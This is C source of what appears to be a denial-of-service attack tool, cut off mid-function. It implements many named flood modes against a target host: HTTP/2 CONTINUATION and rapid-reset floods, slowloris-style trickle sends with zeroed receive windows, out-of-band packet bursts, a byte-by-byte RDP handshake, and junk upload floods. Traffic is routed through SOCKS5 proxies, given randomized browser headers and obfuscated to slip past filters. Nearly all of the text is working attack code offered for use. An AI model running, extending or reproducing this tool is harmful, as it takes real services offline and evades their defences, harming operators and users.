#include "attack.h"
#include "network.h"
#include "logger.h"
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <ifaddrs.h>
#include <signal.h>
#include <stdatomic.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

static __thread Connection *active_conns_list = NULL;

void get_mac_address(const char *iface, unsigned char *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_gateway_mac(const char *iface, unsigned char *mac) {
    FILE *fp = fopen("/proc/net/arp", "r");
    if (!fp) { memset(mac, 0xff, 6); return; }
    char line[256];
    char ip[128], hw_type[128], flags[128], hw_addr[128], mask[128], dev[128];
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%s %s %s %s %s %s", ip, hw_type, flags, hw_addr, mask, dev) == 6) {
            if (strcmp(dev, iface) == 0 && strcmp(hw_addr, "00:00:00:00:00:00") != 0) {
                unsigned int m[6];
                if (sscanf(hw_addr, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                    for (int i=0; i<6; i++) mac[i] = (unsigned char)m[i];
                    fclose(fp);
                    return;
                }
            }
        }
    }
    fclose(fp);
    memset(mac, 0xff, 6); // fallback to broadcast
}

static void generate_random_headers(char *headers_out, char *ua_out, const char *host) {
    const char *os_list[] = {
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64",
        "iPhone; CPU iPhone OS 16_5 like Mac OS X",
        "Linux; Android 13; SM-G991B"
    };
    int os_idx = rand() % 5;
    int chrome_ver = 110 + (rand() % 15);
    snprintf(ua_out, 256, "Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", os_list[os_idx], chrome_ver);
    const char *plat = "Windows";
    if (os_idx == 1) plat = "macOS"; else if (os_idx == 2) plat = "Linux"; else if (os_idx == 3) plat = "iOS"; else if (os_idx == 4) plat = "Android";
    snprintf(headers_out, 1024,
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Sec-Ch-Ua: \"Google Chrome\";v=\"%d\", \"Chromium\";v=\"%d\", \"Not-A.Brand\";v=\"24\"\r\n"
        "Sec-Ch-Ua-Mobile: ?0\r\n"
        "Sec-Ch-Ua-Platform: \"%s\"\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: keep-alive\r\n\r\n",
        host, ua_out, chrome_ver, chrome_ver, plat
    );
}

void generate_heavy_payloads() {
    LOG_INFO("Tornado V12: Pre-calculating 64 lethal payload variants...");
    for (int i = 0; i < PAYLOAD_CACHE_COUNT; i++) {
        payload_pool[i] = malloc(STABLE_PAYLOAD_SIZE);
        int mode = i % 5;
        
        if (mode == 0) { 
            char boundary[64];
            snprintf(boundary, 64, "----%08x%08x", rand(), rand());
            int len = snprintf((char*)payload_pool[i], STABLE_PAYLOAD_SIZE,
                "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n", boundary);
            
            for (int j = len; j < STABLE_PAYLOAD_SIZE - 64; j++) payload_pool[i][j] = rand() % 256;
            
        } else if (mode == 1) { 
            memset(payload_pool[i], '{', 100); 
            for (int j = 100; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = 'A' + (rand() % 26);
        } else if (mode == 2) { 
            
            for (int j = 0; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = (j % 2 == 0) ? 0 : 0xFF;
        } else { 
            for (int j = 0; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = rand() % 256;
        }
    }
}



void encrypt_payload(unsigned char *buffer, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        buffer[i] ^= key;
        key = (key + 1) % 256;
    }
}

void obfuscate_payload(unsigned char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        buffer[i] = (buffer[i] << 4) | (buffer[i] >> 4);
    }
}

void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id) {
    int raw_fd = -1;
    if (args.is_raw_udp) {
        raw_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
        if (raw_fd < 0) {
            LOG_ERR("Raw socket failed");
            return;
        }
    }

    Connection *conn = (Connection *)ev->data.ptr;
    if (!conn) {
        if (raw_fd != -1) close(raw_fd);
        return;
    }
    unsigned char buf[1024];
    int n;
    int force_write = 0;

    if (ev->events & (EPOLLERR | EPOLLHUP)) {
        if (raw_fd != -1) close(raw_fd);
        goto cleanup;
    }

    if (ev->events & EPOLLOUT) {
        conn->writable = 1;
    }

    if (ev->events & EPOLLIN) {
        
        if ((args.is_v15_raw_amp || args.is_vn_tcp || (args.is_hybrid_v15 && proxy_count > 0 && !conn->is_udp_assoc)) && conn->stage == STAGE_ATTACKING) {
            unsigned char drain[65536];
            int dr;
            while ((dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT)) > 0) {}
            if (dr == 0) goto cleanup;
            if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            if (args.is_vn_tcp) {
                // vn: re-arm EPOLLOUT to keep sending
                struct epoll_event ev2;
                ev2.events = EPOLLIN | EPOLLOUT | EPOLLET;
                ev2.data.ptr = conn;
                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev2);
                conn->writable = 1;
            } else {
                int ret;
                while (1) {
                    int s = 16384 + (fast_rand() % 16384);
                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
                    if (ret <= 0) {
                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
                            conn->writable = 0;
                        }
                        break;
                    }
                    thread_stats[thread_id].packets++;
                    thread_stats[thread_id].tcp_packets++;
                    thread_stats[thread_id].bytes += ret;
                }
                if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            }
            return;
        }

        if (args.is_hybrid_v15 && proxy_count > 0 && conn->is_udp_assoc && conn->stage == STAGE_ATTACKING) {
            unsigned char drain[1024];
            int dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT);
            if (dr == 0) goto cleanup;
            if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        if (args.is_v4_nightmare && conn->stage == STAGE_ATTACKING) {
            n = recv(conn->fd, buf, 1, 0); 
            if (n <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        
        if (args.is_crash_mode && conn->stage == STAGE_ATTACKING) {
            while(recv(conn->fd, buf, sizeof(buf), MSG_DONTWAIT) > 0);
            return;
        }

        n = recv(conn->fd, buf, sizeof(buf), 0);
        if (n <= 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) return;
            goto cleanup;
        }

        if (conn->stage == STAGE_SOCKS_GREET) {
            if (buf[1] == 0x02) {
                conn->stage = STAGE_SOCKS_AUTH;
                conn->sub_stage = 0;
                int ulen = strlen(conn->proxy->user);
                int plen = strlen(conn->proxy->pass);
                unsigned char abuf[256];
                abuf[0] = 0x01; abuf[1] = ulen;
                memcpy(abuf + 2, conn->proxy->user, ulen);
                abuf[2 + ulen] = plen;
                memcpy(abuf + 3 + ulen, conn->proxy->pass, plen);
                send(conn->fd, abuf, 3 + ulen + plen, MSG_NOSIGNAL);
                conn->sub_stage = 1;
            }
            else if (buf[1] == 0x00) {
                conn->stage = STAGE_SOCKS_CONN;
                conn->sub_stage = 0;
                unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
                int req_len = 3;
                if (conn->is_udp_assoc) {
                    req[req_len++] = 0x01;
                    memset(req + req_len, 0, 6);
                    req_len += 6;
                } else if (is_ipv4(args.host)) {
                    req[req_len++] = 0x01;
                    struct in_addr addr;
                    inet_pton(AF_INET, args.host, &addr);
                    memcpy(req + req_len, &addr.s_addr, 4);
                    req_len += 4;
                    unsigned short p = htons(args.port);
                    memcpy(req + req_len, &p, 2);
                    req_len += 2;
                } else {
                    req[req_len++] = 0x03;
                    int hlen = strlen(args.host);
                    req[req_len++] = hlen;
                    memcpy(req + req_len, args.host, hlen);
                    req_len += hlen;
                    unsigned short p = htons(args.port);
                    memcpy(req + req_len, &p, 2);
                    req_len += 2;
                }
                send(conn->fd, req, req_len, MSG_NOSIGNAL);
                conn->sub_stage = 1;
            }
            else goto cleanup;
        } 
        else if (conn->stage == STAGE_SOCKS_AUTH) {
            if (buf[1] != 0x00) goto cleanup; 
            conn->stage = STAGE_SOCKS_CONN;
            conn->sub_stage = 0;
            unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
            int req_len = 3;
            if (conn->is_udp_assoc) {
                req[req_len++] = 0x01;
                memset(req + req_len, 0, 6);
                req_len += 6;
            } else if (is_ipv4(args.host)) {
                req[req_len++] = 0x01;
                struct in_addr addr;
                inet_pton(AF_INET, args.host, &addr);
                memcpy(req + req_len, &addr.s_addr, 4);
                req_len += 4;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            } else {
                req[req_len++] = 0x03;
                int hlen = strlen(args.host);
                req[req_len++] = hlen;
                memcpy(req + req_len, args.host, hlen);
                req_len += hlen;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            }
            send(conn->fd, req, req_len, MSG_NOSIGNAL);
            conn->sub_stage = 1;
        }
        else if (conn->stage == STAGE_SOCKS_CONN) {
            if (buf[1] != 0x00) goto cleanup; 
            
            if (conn->proxy) {
                conn->proxy->fail_count = 0;
                conn->proxy->is_dead = 0;
                __sync_fetch_and_add(&conn->proxy->success_count, 1);
            }
            
            if (conn->is_udp_assoc) {
                struct sockaddr_in raddr;
                memset(&raddr, 0, sizeof(raddr));
                raddr.sin_family = AF_INET;
                if (buf[3] == 0x01) {
                    memcpy(&raddr.sin_addr.s_addr, buf + 4, 4);
                    memcpy(&raddr.sin_port, buf + 8, 2);
                } else if (buf[3] == 0x03) {
                    int len = buf[4];
                    char dom[256];
                    memcpy(dom, buf + 5, len);
                    dom[len] = '\0';
                    char ip_buf[64];
                    if (resolve_host(dom, ip_buf) == 0) {
                        inet_pton(AF_INET, ip_buf, &raddr.sin_addr);
                    } else {
                        inet_pton(AF_INET, conn->proxy->host, &raddr.sin_addr);
                    }
                    memcpy(&raddr.sin_port, buf + 5 + len, 2);
                } else {
                    inet_pton(AF_INET, conn->proxy->host, &raddr.sin_addr);
                    raddr.sin_port = htons(conn->proxy->port);
                }
                conn->udp_relay_addr = raddr;
                
                int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                if (ufd < 0) goto cleanup;
                int sndbuf = 1048576;
                setsockopt(ufd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                if (connect(ufd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
                    close(ufd);
                    goto cleanup;
                }
                conn->client_udp_fd = ufd;
            }
            
            if (args.is_v15_raw_amp || (args.is_hybrid_v15 && !conn->is_udp_assoc) || args.is_vn_tcp) {
                int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
                setsockopt(conn->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
            }
            
            if ((args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) && args.port == 443) {
                conn->stage = STAGE_TLS_HANDSHAKE;
                conn->ssl = SSL_new(ssl_ctx);
                SSL_set_fd(conn->ssl, conn->fd);
                SSL_set_tlsext_host_name(conn->ssl, args.host);
            } else if (args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) {
                conn->stage = STAGE_H2_PREFACE;
            } else {
                conn->stage = STAGE_ATTACKING;
                conn->writable = 1;
                thread_stats[thread_id].connect_success++;
            }
            conn->sub_stage = 0;
            ev->events |= EPOLLOUT;
            force_write = 1;
        }
    }

    if ((ev->events & EPOLLOUT) || force_write) {
        if (conn->stage == STAGE_TLS_HANDSHAKE) {
            int ret = SSL_connect(conn->ssl);
            if (ret == 1) {
                conn->stage = STAGE_H2_PREFACE;
                conn->sub_stage = 0;
            } else {
                int err = SSL_get_error(conn->ssl, ret);
                if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                return;
            }
        }

        if (conn->stage == STAGE_H2_PREFACE) {
            if (conn->sub_stage == 0) {
                const char *preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                if (conn->ssl) SSL_write(conn->ssl, preface, 24);
                else send(conn->fd, preface, 24, 0);
                
                
                unsigned char spoofed_h2_settings[] = {
                    0x00, 0x00, 0x18, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 
                    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x03, 0x00, 0x00, 0x03, 0xe8, 
                    0x00, 0x04, 0x00, 0x5f, 0x5e, 0x10  
                };
                if (conn->ssl) SSL_write(conn->ssl, spoofed_h2_settings, sizeof(spoofed_h2_settings));
                else send(conn->fd, spoofed_h2_settings, sizeof(spoofed_h2_settings), 0);
                
                unsigned char window_update[] = {
                    0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x0f, 0x00, 0x00
                };
                if (conn->ssl) SSL_write(conn->ssl, window_update, sizeof(window_update));
                else send(conn->fd, window_update, sizeof(window_update), 0);
                
                conn->sub_stage = 1;
                conn->stage = STAGE_ATTACKING;
                conn->h2_stream_id = 1;
                thread_stats[thread_id].connect_success++;
            }
        }
        if (conn->stage == STAGE_CONNECTING) {
            if (conn->proxy) {
                unsigned char greet[] = {0x05, 0x02, 0x00, 0x02};
                send(conn->fd, greet, 4, 0);
                conn->stage = STAGE_SOCKS_GREET;
                
                
                int mss = 536 + (rand() % 924); 
                setsockopt(conn->fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
            } else {
                if (conn->is_udp_assoc) {
                    int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                    if (ufd >= 0) {
                        int sndbuf = 1048576;
                        setsockopt(ufd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                        struct sockaddr_in raddr;
                        memset(&raddr, 0, sizeof(raddr));
                        raddr.sin_family = AF_INET;
                        raddr.sin_port = htons(conn->target_port);
                        inet_pton(AF_INET, args.target_ip, &raddr.sin_addr);
                        if (connect(ufd, (struct sockaddr *)&raddr, sizeof(raddr)) >= 0) {
                            conn->client_udp_fd = ufd;
                        } else {
                            close(ufd);
                        }
                    }
                }
                conn->stage = STAGE_ATTACKING;
                conn->writable = 1;
                thread_stats[thread_id].connect_success++;
            }
        } 
        
        if (conn->stage == STAGE_SOCKS_AUTH && conn->sub_stage == 0) {
            int ulen = strlen(conn->proxy->user);
            int plen = strlen(conn->proxy->pass);
            buf[0] = 0x01; buf[1] = ulen;
            memcpy(buf + 2, conn->proxy->user, ulen);
            buf[2 + ulen] = plen;
            memcpy(buf + 3 + ulen, conn->proxy->pass, plen);
            send(conn->fd, buf, 3 + ulen + plen, 0);
            conn->sub_stage = 1;
        }
        
        if (conn->stage == STAGE_SOCKS_CONN && conn->sub_stage == 0) {
            unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
            int req_len = 3;
            if (conn->is_udp_assoc) {
                req[req_len++] = 0x01;
                memset(req + req_len, 0, 6);
                req_len += 6;
            } else if (is_ipv4(args.host)) {
                req[req_len++] = 0x01; 
                struct in_addr addr;
                inet_pton(AF_INET, args.host, &addr);
                memcpy(req + req_len, &addr.s_addr, 4);
                req_len += 4;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            } else {
                req[req_len++] = 0x03; 
                int hlen = strlen(args.host);
                req[req_len++] = hlen;
                memcpy(req + req_len, args.host, hlen);
                req_len += hlen;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            }
            send(conn->fd, req, req_len, 0);
            conn->sub_stage = 1;
        }

        if (conn->stage == STAGE_ATTACKING) {
            long long now = get_ms();
            
            
            if (args.is_v8_phantom) {
                if (conn->sub_stage == 0) {
                    
                    unsigned char h2_packet[256];
                    int pos = 0;
                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1}; 
                    int h_len = sizeof(headers_payload);
                    
                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
                    h2_packet[pos++] = h_len & 0xFF;
                    h2_packet[pos++] = 0x01; 
                    h2_packet[pos++] = 0x00; 
                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                    memcpy(h2_packet + pos, headers_payload, h_len);
                    pos += h_len;
                    
                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                    
                    conn->thread_id = 10 + (rand() % 40); 
                } else {
                    
                    if (now - conn->last_pulse_ms >= conn->thread_id) {
                        unsigned char h2_packet[4096];
                        int pos = 0;
                        
                        
                        
                        for (int i = 0; i < 30; i++) {
                            unsigned char cont_payload[] = {0xde, 0xad, 0xbe, 0xef}; 
                            int h_len = sizeof(cont_payload);
                            
                            h2_packet[pos++] = (h_len >> 16) & 0xFF;
                            h2_packet[pos++] = (h_len >> 8) & 0xFF;
                            h2_packet[pos++] = h_len & 0xFF;
                            h2_packet[pos++] = 0x09; 
                            h2_packet[pos++] = 0x00; 
                            h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                            h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                            h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                            h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                            memcpy(h2_packet + pos, cont_payload, h_len);
                            pos += h_len;
                        }
                        
                        if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                        else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                        
                        thread_stats[thread_id].packets += 30; 
                        conn->last_pulse_ms = now;
                        conn->thread_id = 5 + (rand() % 20); 
                    }
                }
            }
            
            else if (args.is_v6_void) {
                if (conn->sub_stage == 0) {
                    
                    unsigned char h2_packet[128];
                    int pos = 0;
                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1}; 
                    int h_len = sizeof(headers_payload);
                    
                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
                    h2_packet[pos++] = h_len & 0xFF;
                    h2_packet[pos++] = 0x01; 
                    h2_packet[pos++] = 0x00; 
                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                    memcpy(h2_packet + pos, headers_payload, h_len);
                    pos += h_len;
                    
                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    conn->sub_stage = 1; 
                    conn->last_pulse_ms = now;
                } else {
                    if (now - conn->last_pulse_ms >= 1) { 
                        unsigned char h2_packet[8192];
                        int pos = 0;
                        
                        
                        for (int i = 0; i < 200; i++) {
                            unsigned char cont_payload[] = {0xaa, 0xbb, 0xcc, 0xdd}; 
                            int h_len = sizeof(cont_payload);
                            
                            h2_packet[pos++] = (h_len >> 16) & 0xFF;
                            h2_packet[pos++] = (h_len >> 8) & 0xFF;
                            h2_packet[pos++] = h_len & 0xFF;
                            h2_packet[pos++] = 0x09; 
                            h2_packet[pos++] = 0x00; 
                            h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                            h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                            h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                            h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                            memcpy(h2_packet + pos, cont_payload, h_len);
                            pos += h_len;
                        }
                        
                        if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                        else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                        
                        thread_stats[thread_id].packets += 200;
                        conn->last_pulse_ms = now;
                    }
                }
            }
            
            else if (args.is_v5_rapid) {
                if (now - conn->last_pulse_ms >= 5) {
                    
                    unsigned char h2_packet[8192];
                    int pos = 0;
                    
                    for (int i = 0; i < 50; i++) { 
                        
                        
                        unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b, 0xa0, 0xab, 0x90, 0xf4, 0xff};
                        int h_len = sizeof(headers_payload);
                        
                        h2_packet[pos++] = (h_len >> 16) & 0xFF;
                        h2_packet[pos++] = (h_len >> 8) & 0xFF;
                        h2_packet[pos++] = h_len & 0xFF;
                        h2_packet[pos++] = 0x01; 
                        h2_packet[pos++] = 0x04; 
                        h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                        h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                        h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                        h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                        memcpy(h2_packet + pos, headers_payload, h_len);
                        pos += h_len;

                        
                        h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x04; 
                        h2_packet[pos++] = 0x03; 
                        h2_packet[pos++] = 0x00;
                        h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                        h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                        h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                        h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                        h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x08; 
                        pos += 4;

                        conn->h2_stream_id += 2;
                        if (conn->h2_stream_id > 0x7FFFFFFF) conn->h2_stream_id = 1;
                        if (pos > 7800) break;
                    }

                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    thread_stats[thread_id].packets += 100;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v4_nightmare) {
                if (conn->sub_stage == 0) {
                    char init_payload[] = "GET / HTTP/1.1\r\nHost: \r\n\r\n";
                    send(conn->fd, init_payload, sizeof(init_payload)-1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else if (now - conn->last_pulse_ms >= 2) { 
                    
                    
                    
                    int overlap_size = 12 + (rand() % 8);
                    
                    
                    send(conn->fd, global_buffer_pool + (rand() % 1024), overlap_size, MSG_OOB | MSG_NOSIGNAL);
                    
                    
                    send(conn->fd, global_buffer_pool + (rand() % 1024), overlap_size * 2, MSG_NOSIGNAL);
                    
                    thread_stats[thread_id].packets += 2;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v3_killer) {
                if (conn->sub_stage == 0) {
                    
                    char init_payload[] = "GET / HTTP/1.1\r\nHost: \r\n\r\n";
                    send(conn->fd, init_payload, sizeof(init_payload)-1, MSG_NOSIGNAL);
                    
                    
                    int zero = 0;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &zero, sizeof(zero));
                    
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else {
                    
                    
                    if (now - conn->last_pulse_ms >= 10) {
                        send(conn->fd, "V", 1, MSG_NOSIGNAL);
                        thread_stats[thread_id].packets++;
                        conn->last_pulse_ms = now;
                    }
                }
            } 
            
            else if (args.is_v9_hydra) {
                if (conn->sub_stage == 0) {
                    
                    int window_size = (rand() % 2 == 0) ? 0 : 65535;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &window_size, sizeof(window_size));
                    
                    
                    send(conn->fd, "X", 1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else if (now - conn->last_pulse_ms >= 10) {
                    
                    
                    int flags = (rand() % 3 == 0) ? (MSG_OOB | MSG_NOSIGNAL) : MSG_NOSIGNAL;
                    
                    
                    char sack_trigger[16];
                    for(int i=0; i<16; i++) sack_trigger[i] = rand() % 255;
                    
                    send(conn->fd, sack_trigger, sizeof(sack_trigger), flags);
                    
                    
                    int window_size = (rand() % 2 == 0) ? 0 : (1024 + rand() % 8192);
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &window_size, sizeof(window_size));
                    
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v10_persist) {
                if (conn->sub_stage == 0) {
                    
                    int win = (rand() % 2 == 0) ? 0 : 65535;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                    
                    send(conn->fd, "P", 1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                    
                    conn->keepalive_interval_ms = 15000 + (rand() % 15001);
                } else if (now - conn->last_pulse_ms >= conn->keepalive_interval_ms) {
                    
                    int flags = MSG_NOSIGNAL;
                    int r = rand() % 4;
                    if (r == 0) flags |= MSG_OOB;          
                    else if (r == 1) flags |= MSG_DONTWAIT; 
                    
                    send(conn->fd, "P", 1, flags);
                    
                    int win = (rand() % 2 == 0) ? 0 : (1024 + rand() % 8192);
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                    
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                    conn->keepalive_interval_ms = 15000 + (rand() % 15001);
                }
            }
            
            else if (args.is_v12_eclipse) {
                if (now - conn->last_pulse_ms >= 30 + conn->jitter_ms) { 
                    unsigned char *payload = payload_pool[conn->payload_idx % PAYLOAD_CACHE_COUNT];
                    conn->payload_idx++;
                    
                    
                    char pipe_head[512];
                    int h_len = snprintf(pipe_head, 512, 
                        "POST /uploads/%d HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: keep-alive\r\n\r\n", 
                        rand(), args.host, STABLE_PAYLOAD_SIZE);
                    
                    if (conn->ssl) {
                        SSL_write(conn->ssl, pipe_head, h_len);
                        SSL_write(conn->ssl, payload, STABLE_PAYLOAD_SIZE);
                    } else {
                        send(conn->fd, pipe_head, h_len, MSG_NOSIGNAL);
                        send(conn->fd, payload, STABLE_PAYLOAD_SIZE, MSG_NOSIGNAL);
                    }
                    
                    thread_stats[thread_id].packets += 2;
                    thread_stats[thread_id].bytes += (h_len + STABLE_PAYLOAD_SIZE);
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v13_shadow) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) {
                    BypassPattern *bp = &bypass_patterns[rand() % bypass_patterns_count];
                    unsigned char packet[1500];
                    memcpy(packet, bp->pattern, bp->length);
                    
                    for(int j=bp->length; j<1400; j++) packet[j] = rand() % 256;
                    
                    
                    encrypt_payload(packet, 1400, rand() % 256);
                    obfuscate_payload(packet, 1400);
                    
                    send(conn->fd, packet, 1400, MSG_NOSIGNAL);
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v14_phantom) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) { 
                    if (conn->sub_stage < 19) {
                        
                        
                        unsigned char rdp_cr[] = {
                            0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03, 
                            0x00, 0x00, 0x00
                        };
                        send(conn->fd, &rdp_cr[conn->sub_stage], 1, MSG_NOSIGNAL);
                        conn->sub_stage++;
                        conn->last_pulse_ms = now;
                    } 
                    else if (conn->sub_stage == 19) {
                        
                        
                        int win = 0;
                        setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                        
                        
                        for (int i = 0; i < 5; i++) {
                            unsigned char poison = rand() % 256;
                            send(conn->fd, &poison, 1, MSG_OOB | MSG_NOSIGNAL);
                        }
                        
                        conn->sub_stage = 20;
                        conn->last_pulse_ms = now;
                    } 
                    else {
                        
                        if (now - conn->last_pulse_ms >= 20000) {
                            goto cleanup; 
                        }
                        
